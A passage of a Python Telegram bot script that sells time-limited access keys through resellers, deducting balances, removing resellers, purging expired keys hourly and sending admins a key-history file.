                f"➖ *𝗞𝗘𝗬 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n"
                f"*𝗞𝗘𝗬* : `{key}`\n"
                f"*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n"
                f"*𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱* : {cost} Rs\n"
                f"*𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲* : {resellers[user_id]} Rs\n\n"
                f"*𝗕𝗼𝘁 𝗟𝗶𝗻𝗸* : {escaped_bot_link}"
            )
        else:
            response = (
                f"*➖ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲 {duration} 𝗞𝗲𝘆 *\n"
                f"*𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗕𝗮𝗹𝗮𝗻𝗰𝗲*: {cost} Rs\n"
                f"*𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲*: {current_balance} Rs"
            )
    else:
        response = "⛔️ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 : 𝗢𝘄𝗡𝗲𝗿 | 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗢𝗻𝗹𝘆 𝗖𝗼𝗺𝗺𝗮𝗻𝗱*"

    bot.reply_to(message, response, parse_mode='Markdown')


@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    # Check if the user is an admin
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            # Extract the reseller ID from the message
            command_parts = message.text.split()
            if len(command_parts) != 2:
                bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱>")
                return
            
            reseller_id = command_parts[1]
            
            # Check if the reseller exists
            if reseller_id not in resellers:
                bot.reply_to(message, "*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.*", parse_mode='Markdown')
                return
            
            # Remove the reseller
            del resellers[reseller_id]
            
            # Save changes to resellers.json
            save_resellers(resellers)
            
            bot.reply_to(
                message,
                f"*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆*",
                parse_mode='Markdown'
            )
        
        except Exception as e:
            bot.reply_to(
                message,
                f"*𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗* {str(e)}*",
                parse_mode='Markdown'
            )
    else:
        bot.reply_to(
            message,
            "‼ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ‼",
            parse_mode='Markdown'
        )

def some_function():
    global keys  # Declare 'keys' as global at the start
    if 'some_key' not in keys:
        keys['some_key'] = 'some_value'

# Function to delete expired keys from keys.json
def delete_expired_keys():
    global keys  # Declare 'keys' as global at the start of the function

    current_time = datetime.datetime.now()
    updated_keys = {
        key: value for key, value in keys.items()
        if value["expiration_time"] is None or datetime.datetime.strptime(value["expiration_time"], '%Y-%m-%d %H:%M:%S') > current_time
    }

    # Check if any keys were removed
    if len(updated_keys) < len(keys):
        keys = updated_keys  # Update the global 'keys' variable
        save_keys()

# Add a new command to send the history file
@bot.message_handler(commands=['history'])
def send_history_file(message):
    user_id = str(message.chat.id)
    
    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(
            message,
            "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗘𝗥 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️",
            parse_mode='Markdown'
        )
        return

    # Ensure the history file exists, create it if not
    try:
        if not os.path.exists("key_history.txt"):
            with open("key_history.txt", "w") as file:
                file.write("")  # Create an empty file
            bot.reply_to(message, "*📄 𝗞𝗘𝗬 𝗛𝗶𝘀𝘁𝗼𝗿𝘆 𝗙𝗶𝗹𝗲 𝘄𝗮𝘀 𝗺𝗶𝘀𝘀𝗶𝗻𝗴, 𝘀𝗼 𝗮 𝗻𝗲𝘄 𝗙𝗶𝗹𝗲 𝘄𝗮𝘀 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 👍*", parse_mode='Markdown')

        # Check if the file is empty or has content
        if os.stat("key_history.txt").st_size > 0:
            with open("key_history.txt", "rb") as file:
                bot.reply_to(message, "*📂 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗛𝗜𝗦𝗧𝗢𝗥𝗬 𝗙𝗢𝗨𝗡𝗗*", parse_mode='Markdown')
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "*📂 𝗡𝗢 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗛𝗜𝗦𝗧𝗢𝗥𝗬 𝗙𝗢𝗨𝗡𝗗*", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"{e}")


# Schedule periodic cleanup of expired keys
def schedule_key_cleanup():
    while True:
        delete_expired_keys()
        time.sleep(3600)  # Run every hour

# Start the cleanup thread when the script runs
if __name__ == "__main__":
    load_data()
    
    # Start a background thread for key cleanup
    threading.Thread(target=schedule_key_cleanup, daemon=True).start()

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(1)
